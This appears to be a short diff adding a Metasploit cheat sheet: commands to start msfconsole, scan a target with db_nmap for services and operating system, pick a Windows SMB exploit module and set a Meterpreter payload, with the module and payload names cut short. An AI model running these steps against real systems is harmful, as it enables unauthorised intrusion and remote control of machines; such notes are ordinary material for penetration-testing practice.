@@ -1,0 +1,8 @@
+msfconsole
+?
+db_nmap -sV -O [ip]
+show options
+use
+hosts
+use exploit/windows/smb
+set PAYLOAD windows/meterpreter/
